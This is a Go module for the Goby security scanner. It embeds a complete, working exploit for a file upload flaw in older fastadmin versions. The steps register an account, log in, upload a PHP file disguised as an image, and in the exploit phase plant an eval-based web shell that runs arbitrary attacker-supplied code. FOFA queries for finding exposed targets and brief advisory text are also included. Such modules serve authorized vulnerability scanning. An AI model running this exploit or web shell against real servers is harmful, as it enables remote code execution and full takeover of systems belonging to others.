package exploits

import (
    "git.gobies.org/goby/goscanner/goutils"
)

func init() {
    expJson := `{
    "Name": "2018 version of fastadmin file upload vulnerability",
    "Description": "<p>fastadmin is a set of fast background development framework based on ThinkPHP and Bootstrap of Shenzhen Speed Creation Technology Co., Ltd.</p><p>There is a file upload vulnerability in the ajax/upload method before the v1.0.0.20180417 version of fastadmin, which is caused by a logical error in the verification of the suffix</p>",
    "Product": "fastadmin",
    "Homepage": "https://gitee.com/karson/fastadmin",
    "DisclosureDate": "2022-07-18",
    "Author": "qiushui_sir@163.com",
    "FofaQuery": "body=\"Copyright © fastadmin.net\" || title==\"FastAdmin\" || body=\"class=\\\"navbar-brand\\\">FastAdmin</a>\" || body=\"<a href=\\\"/\\\" class=\\\"navbar-brand\\\">FastAdmin</a>\" || (title=\"fastadmin\" && (body=\"<h1>FastAdmin</h1>\" || body=\"fastadmin.net\"))",
    "GobyQuery": "body=\"Copyright © fastadmin.net\" || title==\"FastAdmin\" || body=\"class=\\\"navbar-brand\\\">FastAdmin</a>\" || body=\"<a href=\\\"/\\\" class=\\\"navbar-brand\\\">FastAdmin</a>\" || (title=\"fastadmin\" && (body=\"<h1>FastAdmin</h1>\" || body=\"fastadmin.net\"))",
    "Level": "3",
    "Impact": "<p>There is a file upload vulnerability before the v1.0.0.20180417 version of fastadmin. Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. The manufacturer has fixed this vulnerability, please upgrade to the latest version :</p><p><a href=\"https://gitee.com/karson/fastadmin\">https://gitee.com/karson/fastadmin</a></p><p>2. Deploy a web application firewall to monitor file upload operations</p><p>3. If it is not necessary, it is forbidden to access the system from the public network</p>",
    "References": [
        "https://github.com/karsonzhang/fastadmin/releases/tag/v1.0.0.20180406_beta"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "code",
            "type": "input",
            "value": "phpinfo();",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/index.php/api/user/register",
                "follow_redirect": false,
                "header": {
                    "Cookie": "PHPSESSID=rvitsn3e1lbbcab8h5gccalah8",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "username=fastadmin_2018&password=admin@123&email=&mobile="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "OR",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "{\"code\":1,\"msg\":\"注册成功",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "{\"code\":0,\"msg\":\"用户名已经存",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/index.php/index/user/login",
                "follow_redirect": false,
                "header": {
                    "Cookie": "PHPSESSID=rvitsn3e1lbbcab8h5gccalah8"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "__token__",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "token|lastbody|regex|\"__token__\" value=\"(.*?)\""
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/index.php/index/user/login",
                "follow_redirect": false,
                "header": {
                    "Cookie": "PHPSESSID=rvitsn3e1lbbcab8h5gccalah8",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "__token__={{{token}}}&account=fastadmin_2018&password=admin%40123&keeplogin=1"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "Set-Cookie: token=",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "logtoken|lastheader|regex|token=(.*?);"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/index.php/index/ajax/upload",
                "follow_redirect": false,
                "header": {
                    "Cookie": "PHPSESSID=rvitsn3e1lbbcab8h5gccalah8; token={{{logtoken}}}",
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarypT3Bbj7EGhdhhZH0"
                },
                "data_type": "text",
                "data": "------WebKitFormBoundarypT3Bbj7EGhdhhZH0\nContent-Disposition: form-data; name=\"file\"; filename=\"a.php\"\nContent-Type: png\n\n<?php echo md5(123);?>\n------WebKitFormBoundarypT3Bbj7EGhdhhZH0--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "{\"code\":1,\"msg\":\"上传成功",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "date|lastbody|regex|\\/([\\d]{1,8})\\\\",
                "filename|lastbody|regex|\\/([\\w]{1,32})\\.php"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/uploads/{{{date}}}/{{{filename}}}.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "202cb962ac59075b964b07152d234b70",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/index.php/index/user/login",
                "follow_redirect": false,
                "header": {
                    "Cookie": "PHPSESSID=rvitsn3e1lbbcab8h5gccalah8"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "__token__",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "token|lastbody|regex|\"__token__\" value=\"(.*?)\""
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/index.php/index/user/login",
                "follow_redirect": false,
                "header": {
                    "Cookie": "PHPSESSID=rvitsn3e1lbbcab8h5gccalah8",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "__token__={{{token}}}&account=fastadmin_2018&password=admin%40123&keeplogin=1"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "Set-Cookie: token=",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "logtoken|lastheader|regex|token=(.*?);"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/index.php/index/ajax/upload",
                "follow_redirect": false,
                "header": {
                    "Cookie": "PHPSESSID=rvitsn3e1lbbcab8h5gccalah8; token={{{logtoken}}}",
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarypT3Bbj7EGhdhhZH0"
                },
                "data_type": "text",
                "data": "------WebKitFormBoundarypT3Bbj7EGhdhhZH0\nContent-Disposition: form-data; name=\"file\"; filename=\"a.php\"\nContent-Type: png\n\n<?php @eval($_REQUEST['img']);?>\n------WebKitFormBoundarypT3Bbj7EGhdhhZH0--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "{\"code\":1,\"msg\":\"上传成功",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "date|lastbody|regex|\\/([\\d]{1,8})\\\\",
                "filename|lastbody|regex|\\/([\\w]{1,32})\\.php"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/uploads/{{{date}}}/{{{filename}}}.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "img={{{code}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "202cb962ac59075b964b07152d234b70",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\w\\W]+)"
            ]
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "10.0",
    "Translation": {
        "CN": {
            "Name": "fastadmin 2018版本文件上传漏洞",
            "Product": "fastadmin",
            "Description": "<p><span style=\"color: rgb(62, 62, 62);\">fastadmin是<span style=\"color: rgb(62, 62, 62);\">深圳极速创想科技有限公司</span>的一套<span style=\"color: rgb(62, 62, 62);\">基于ThinkPHP和Bootstrap的极速后台开发框架。</span></span><br></p><p>fastadmin的v1.0.0.20180417版本之前的ajax/upload方法存在文件上传漏洞，该漏洞源于对后缀的验证存在逻辑错误</p>",
            "Recommendation": "<p>1、厂商已修复此漏洞，<span style=\"font-size: 17.5px;\"> </span>请用户升级至最新版:&nbsp;<a href=\"https://gitee.com/karson/fastadmin\">https://gitee.com/karson/fastadmin</a></p><p>2、部署web应用防火墙，对文件上传操作进行监控</p><p>3、如非必要，禁止公网访问此系统</p>",
            "Impact": "<p><span style=\"color: rgb(62, 62, 62); font-size: medium;\">fastadmin的<span style=\"font-size: medium; color: rgb(62, 62, 62);\">v1.0.0.20180417</span><span style=\"font-size: medium; color: rgb(62, 62, 62);\">版本之前</span><span style=\"color: rgb(22, 28, 37); font-size: medium;\">存在文件上传漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</span></span></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "2018 version of fastadmin file upload vulnerability",
            "Product": "fastadmin",
            "Description": "<p>fastadmin is a set of fast background development framework based on ThinkPHP and Bootstrap of Shenzhen Speed Creation Technology Co., Ltd.</p><p>There is a file upload vulnerability in the ajax/upload method before the v1.0.0.20180417 version of fastadmin, which is caused by a logical error in the verification of the suffix</p>",
            "Recommendation": "<p>1. The manufacturer has fixed this vulnerability, please upgrade to the latest version :</p><p><a href=\"https://gitee.com/karson/fastadmin\">https://gitee.com/karson/fastadmin</a><br></p><p>2. Deploy a web application firewall to monitor file upload operations</p><p>3. If it is not necessary, it is forbidden to access the system from the public network</p>",
            "Impact": "<p>There is a file upload vulnerability before the v1.0.0.20180417 version of fastadmin.&nbsp;Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

    ExpManager.AddExploit(NewExploit(
        goutils.GetFileName(),
        expJson,
        nil,
        nil,
    ))
}